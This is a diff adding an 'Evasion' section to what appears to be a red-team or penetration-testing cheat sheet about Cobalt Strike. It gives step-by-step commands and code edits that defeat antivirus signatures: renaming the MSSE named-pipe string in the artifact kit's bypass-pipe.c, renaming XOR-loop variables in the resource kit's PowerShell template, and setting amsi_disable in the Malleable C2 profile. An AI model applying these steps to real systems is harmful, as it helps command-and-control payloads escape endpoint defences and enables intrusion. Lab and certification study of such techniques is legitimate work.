@@ -447,3 +447,55 @@ $shortcut.Save()
 ```
 portscan <CIDR> 139,445,3389,5985 none 1024
 ```
+    
+## Evasion
+### Artifact-kit
+```
+vim /opt/cobaltstrike/artifact-kit/src-common/bypass-pipe.c
+```
+
+### Changed this part from --> to
+```
+"%c%c%c%c%c%c%c%c%cMSSE-%d-server"
+"%c%c%c%c%c%c%c%c%cService-%d-server"
+```
+
+#### Then run build.sh
+```
+./build.sh
+```
+
+#### Download files to W10
+```
+pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
+```
+    
+- Make sure C:\tools\cobaltstrike\Artifactkit\dist-pip\artifact.cna is loaded
+
+### Resource-kit
+```
+vim /opt/cobalstrike/ResourceKit/template.x64.ps1
+```
+    
+#### Changed all variables in the file from this part --> to
+```
+for ($x = 0; $x -lt $var_code.Count; $x++) {
+  $var_code[$x] = $var_code[$x] -bxor 35
+}
+
+
+for ($i = 0; $i -lt $var_service.Count; $i++) {
+	$var_service[$i] = $var_service[$i] -bxor 35
+}
+```
+
+- Find & Replace for $x -> $i and $var_code -> $var_service.
+- Make sure C:\tools\cobaltstrike\Resourcekit\resources.cna is loaded
+
+### Amsi
+#### Add the following to the .profile
+```
+post-ex {
+    set amsi_disable "true";
+}
+```
